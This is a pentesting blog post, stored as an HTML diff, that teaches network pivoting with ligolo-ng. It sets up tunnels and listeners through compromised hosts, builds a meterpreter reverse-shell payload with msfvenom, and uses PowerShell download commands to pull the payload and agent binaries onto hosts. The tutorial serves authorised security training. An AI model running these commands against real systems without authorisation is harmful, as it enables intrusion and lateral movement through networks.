@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Ligolo-ng — Pivoting, Reverse Shells and File Transfers | arth0s&#39; blog</title>
+<meta property="og:title" content="Ligolo-ng — Pivoting, Reverse Shells and File Transfers | arth0s&#39; blog" />
+<meta name="twitter:title" content="Ligolo-ng — Pivoting, Reverse Shells and File Transfers | arth0s&#39; blog" />
+<meta itemprop="name" content="Ligolo-ng — Pivoting, Reverse Shells and File Transfers | arth0s&#39; blog" />
+<meta name="application-name" content="Ligolo-ng — Pivoting, Reverse Shells and File Transfers | arth0s&#39; blog" />
+<meta property="og:site_name" content="Awesome hugo blog" />
+
+<meta name="description" content="Minimal Hugo blog theme with light and dark mode support">
+<meta itemprop="description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta property="og:description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta name="twitter:description" content="Minimal Hugo blog theme with light and dark mode support" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="https://arth0s.tech/posts/ligolo-ng/" title="English" />
+
+
+
+  <meta itemprop="image" content="https://arth0s.tech/" />
+  <meta property="og:image" content="https://arth0s.tech/" />
+  <meta name="twitter:image" content="https://arth0s.tech/" />
+  <meta name="twitter:image:src" content="https://arth0s.tech/" />
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-10-03T15:08:50&#43;0300 />
+    <meta property="article:published_time" content=2023-10-03T15:08:50&#43;0300 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Ligolo-ng — Pivoting, Reverse Shells and File Transfers",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-10-03",
+        "description": "",
+        "wordCount":  1553 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-10-03",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "arth0s\u0027 blog"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.124.1">
+
+    
+
+    <link rel="canonical" href="https://arth0s.tech/posts/ligolo-ng/">
+    <link href="/style.min.17edc7f00ac28173d15808dea8024bba9bc6617193902bee27ad9ef668880304.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://arth0s.tech/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://arth0s.tech/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/pages/projects/">
+                        Projects
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Ligolo-ng — Pivoting, Reverse Shells and File Transfers</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-10-03T15:08:50&#43;03:00" itemprop="datePublished"> 3 Oct 2023 </time>
+                </div>
+                
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#setting-up">Setting Up</a>
+          <ul>
+            <li><a href="#scenario">Scenario</a></li>
+          </ul>
+        </li>
+        <li><a href="#reverse-shells">Reverse Shells</a></li>
+        <li><a href="#file-transfers">File Transfers</a></li>
+        <li><a href="#double-pivot">Double Pivot</a></li>
+        <li><a href="#triple-pivot">Triple Pivot</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <p>Let&rsquo;s talk about pivoting in the context of ethical hacking. In the simplest of terms, pivoting entails moving deeper into a network that we&rsquo;ve compromised. It&rsquo;s a technique that allows us to reach parts of the network that would otherwise be inaccessible from our attacker machine.</p>
+<p>There are many ways and tools out there to accomplish this and you&rsquo;re probably already familiar with some of them such as SSH port forwarding and Chisel, but today we&rsquo;re going to talk about <a href="https://github.com/nicocha30/ligolo-ng">ligolo-ng</a>, developed by <a href="https://github.com/nicocha30">Nicolas Chatelain</a>.</p>
+<p>I had been hearing about this tool for a months before I finally decided to try it out for myself and I finally understood all the hype around it.</p>
+<p>On a high level, ligolo-ng creates a new tun interface on your attacker machine and works like a VPN. It&rsquo;s easy to set up, provides a stable connection, and the syntax is very intuitive.</p>
+<p>I used multiple sources when learning how to use ligolo-ng and I&rsquo;ve tried to summarise everything I&rsquo;ve learned into this article.</p>
+<p>So let&rsquo;s dive in and find out how it works for pivoting, catching reverse shells and transferring files. We&rsquo;ll also look into double and triple pivots.</p>
+<h3 id="setting-up">Setting Up</h3>
+<p>In order to begin, we need to either download the precompiled binaries or compile the files ourselves.</p>
+<p>Let&rsquo;s keep it simple and download the relevant files from the <a href="https://github.com/nicocha30/ligolo-ng/releases/">releases page</a>.</p>
+<p><img src="/posts/ligolo-ng/1.png"></p>
+<p>We&rsquo;re going to need a proxy file which will be the one we use on our attacker machine (in my case and for the sake of this guide that&rsquo;s a Kali Linux VM) and agent files for both Linux and Windows so that we have them ready to go depending on what host we compromise.</p>
+<p>Download the appropriate proxy file for your attacker machine and architecture and some agent files for Windows x64 and Linux x64.</p>
+<h4 id="scenario">Scenario</h4>
+<p>Let&rsquo;s say we&rsquo;ve compromised a web server and we see that the server has two network interfaces, one that&rsquo;s public-facing and another that lets us access the internal network.</p>
+<p><img src="/posts/ligolo-ng/2.png"></p>
+<p>Of course, we would want to access the internal network if we prefer to be able to enumerate from our own machine.</p>
+<p>So let&rsquo;s set up ligolo-ng.</p>
+<p>Go into the folder where you saved and extracted the proxy file. We need to run the following commands:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># Adds a new tun interface to our machine.</span>
+</span></span><span class="line"><span class="cl">sudo ip tuntap add user kali mode tun ligolo
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Enables the new interface.</span>
+</span></span><span class="line"><span class="cl">sudo ip link <span class="nb">set</span> ligolo up
+</span></span></code></pre></div><p>This assumes you&rsquo;re running as kali on your machine, otherwise just change the user to whichever user you&rsquo;re running as.</p>
+<p>We are now ready to run our proxy file. You&rsquo;re welcome to check the help menu and explore the options.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># With the -selfcert flag the tool dynamically generates self-signed certificates.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">./proxy -selfcert
+</span></span></code></pre></div><p>Once you run this, the tool will start listening at port 11601 on all interfaces and you will get access to the tool&rsquo;s command line.</p>
+<p><img src="/posts/ligolo-ng/3.png"></p>
+<p>Now we need to transfer the appropriate agent file to the host we&rsquo;ve compromised using our preferred method of choice. In our scenario, that&rsquo;s a web server running Linux (don&rsquo;t forget to make the file executable after).</p>
+<p>Now we can just run the following command to connect back to our attacking machine:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># The IP will be the IP of our Kali VM/attacking machine.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># The -ignore-cert ignores certificate validation so we don&#39;t have any issues with our self-signed certs.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">./agent -connect 10.10.14.213:11601 -ignore-cert
+</span></span></code></pre></div><p><img src="/posts/ligolo-ng/4.png"></p>
+<p>It may take a second for the connection to be established and when it is, we will see that an agent has joined. You can type <code>help</code> to access the help menu and check out what options you have for yourself.</p>
+<p>Now we can enter <code>session</code> in ligolo-ng&rsquo;s interface, this will list all our sessions and we can specify the one we want either by number or using the arrow keys.</p>
+<p><img src="/posts/ligolo-ng/5.png"></p>
+<p>In our scenario, we want to access the 172.16.5.0/24 network, so we need to open a new terminal and add the corresponding route to our ligolo-ng interface with the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ip route add 172.16.5.0/24 dev ligolo
+</span></span></code></pre></div><p>We can confirm that the route has been added by typing <code>ip route list</code>.</p>
+<p>Going back to ligolo-ng we can now type <code>start</code> which will start a tunnel.</p>
+<p><img src="/posts/ligolo-ng/6.png"></p>
+<p>We can now access the network and do enumeration and scanning with Nmap for example, but in order to catch reverse shells, do file transfers and move further into the network we&rsquo;re going to have to add some listeners.</p>
+<h3 id="reverse-shells">Reverse Shells</h3>
+<p>Let&rsquo;s say from our web server we&rsquo;ve compromised a Windows host sitting at 172.16.5.35 and we want to catch reverse shell from that host. Here&rsquo;s how that would go.</p>
+<p><img src="/posts/ligolo-ng/7.png"></p>
+<p>We can listen to ports on the <em>agent</em> and <em>redirect</em> connections to our attacking machine where we&rsquo;re running the proxy.</p>
+<p>We can do this easily with the following command inside the ligolo-ng session:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># Creates a listener on the machine where we&#39;re running the agent at port 1234 and redirects the traffic to port 4444 on our machine.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
+</span></span></code></pre></div><p><img src="/posts/ligolo-ng/8.png"></p>
+<p>Now in order to catch a reverse shell, your payload needs to be directed to the IP and port of the machine where the listener is created.</p>
+<p>Here is a sample payload with msfvenom that showcases this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># IP of the compromised web server and port of the listener we created.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>172.16.5.15 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1234</span> -f exe -o notmalicious.exe
+</span></span></code></pre></div><p>Since that traffic is forwarded to port 4444 on our machine we can start up Metasploit and listen on that port in order to catch the connection from the shell.</p>
+<p>But wait&hellip; How do we get our payload on the compromised host in the first place?</p>
+<h3 id="file-transfers">File Transfers</h3>
+<p>In order to transfer files, I recommend adding another to listener in order to keep things separate. This is also good in case you have remote code execution and have already used the first listener for a PowerShell reverse shell for example.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Listener on the compromised web server at port 1235 forwarding traffic to port 8000.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># You can use any port you like, in our example I&#39;m using port 8000 as it&#39;s the default port for a python HTTP server.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:8000
+</span></span></code></pre></div><p>You can use <code>listener_list</code> to see all the listeners that have been added.</p>
+<p>Now you can start a python server in the folder where your payload is and pull the file onto the host.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PowerShell" data-lang="PowerShell"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&#34;http://172.16.5.15:1235/notmalicious.exe&#34;</span> <span class="n">-OutFile</span> <span class="n">notmalicious</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></div><p><img src="/posts/ligolo-ng/9.png"></p>
+<p>Now with the file transferred over you can run your payload and catch the shell.</p>
+<p><img src="/posts/ligolo-ng/10.png"></p>
+<h3 id="double-pivot">Double Pivot</h3>
+<p>Let&rsquo;s go deeper into pivoting and keep going with our scenario. Turns out the windows host we compromised also has two interfaces and we want to move deeper into the network.</p>
+<p><img src="/posts/ligolo-ng/11.png"></p>
+<p>We&rsquo;re going to use what we learned about file transfers in order to get the agent.exe file we downloaded earlier onto the host.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&#34;http://172.16.5.15:1235/agent.exe&#34;</span> <span class="n">-OutFile</span> <span class="n">agent</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></div><p>Next we&rsquo;re going to add a listener on port 11601 in the session we already have running and redirect it to port 11601 on our own machine.</p>
+<p>This will allow us to use the agent on the newly compromised host in order to reach back to ligolo-ng and obtain a new session, this time on the Windows host that will let us reach further into the network.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601
+</span></span></code></pre></div><p>Then we can run the agent with the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># We use the IP of the compromised web server using our newly added listener.</span>
+</span></span><span class="line"><span class="cl">./agent.exe -connect 172.16.5.15:11601 -ignore-cert
+</span></span></code></pre></div><p><img src="/posts/ligolo-ng/12.png"></p>
+<p>Once again, ligolo-ng will tell us that an agent has joined. We can use the <code>session</code> command as before to switch to the new session and then <code>start</code> to begin a tunnel over that connection instead.</p>
+<p>We&rsquo;ll get a prompt like this:</p>
+<pre tabindex="0"><code>Tunnel already running, switch from &lt;first agent&gt; to &lt;second agent&gt;? Y/N
+</code></pre><p>Once we type <code>Y</code>, the new tunnel will start.</p>
+<p>We can add the route to the network we want to access as before.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ip route add 172.16.6.0/24 dev ligolo
+</span></span></code></pre></div><p>Just like that, we&rsquo;re good to go.</p>
+<h3 id="triple-pivot">Triple Pivot</h3>
+<p>At this point, doing further pivots is a repeat of the steps we used for our second pivot. I&rsquo;ll go over it briefly only covering commands we&rsquo;ll run and continuing further with our scenario.</p>
+<p><img src="/posts/ligolo-ng/13.png"></p>
+<p>We add our listeners for forwarding traffic, file transfers, and getting back a connection to ligolo-ng, depending on what our further actions will be.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">listener_add --addr 0.0.0.0:1236 --to 0.0.0.0:8001
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">listener_add --addr 0.0.0.0:1237 --to 0.0.0.0:8002
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601
+</span></span></code></pre></div><p>We transfer the agent to the host from our python server (this time running at port 8001) using the IP address of our second pivot host.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&#34;http://172.16.6.35:1236/agent.exe&#34;</span> <span class="n">-OutFile</span> <span class="n">agent</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></div><p>We&rsquo;ll run the agent file to get a connection back to ligolo-ng.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./agent.exe -connect 172.16.6.35:11601 -ignore-cert
+</span></span></code></pre></div><p>Just like that we have a third session going.</p>
+<p><img src="/posts/ligolo-ng/14.png"></p>
+<p>We can switch to it and add the next route we need to access.</p>
+<pre tabindex="0"><code>ip route add 172.16.10.0/24 dev ligolo
+</code></pre><p>This is the end of our scenario and this is what the final result would look like with our three agents giving us access to three sessions that we can switch between seamlessly.</p>
+<p><img src="/posts/ligolo-ng/15.png"></p>
+<hr>
+<p>I hope this was informative and taught you enough to start comfortably using ligolo-ng. It&rsquo;s an incredible tool that makes pivoting trivial once you get used to it.</p>
+<p>Happy hacking!</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/arth0sz" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://app.hackthebox.com/profile/602818" target="_blank" rel="noopener noreferrer me"
+    title="Hackthebox">
+    <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
+    <g>
+        <path
+            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
+        </path>
+    </g>
+</svg>
+</a>
+<a href="https://arth0s.medium.com" target="_blank" rel="noopener noreferrer me"
+    title="Medium">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" fill="currentColor">
+<path 
+d="M180.5 74.3C80.8 74.3 0 155.6 0 256S80.8 437.7 180.5 437.7 361 356.4 361 256 280.2 74.3 180.5 74.3zm288.3 10.6c-49.8 0-90.2 76.6-90.2 171.1s40.4 171.1 90.3 171.1 90.3-76.6 90.3-171.1H559C559 161.5 518.6 84.9 468.8 84.9zm139.5 17.8c-17.5 0-31.7 68.6-31.7 153.3s14.2 153.3 31.7 153.3S640 340.6 640 256C640 171.4 625.8 102.7 608.3 102.7z"/>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="https://arth0s.tech/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
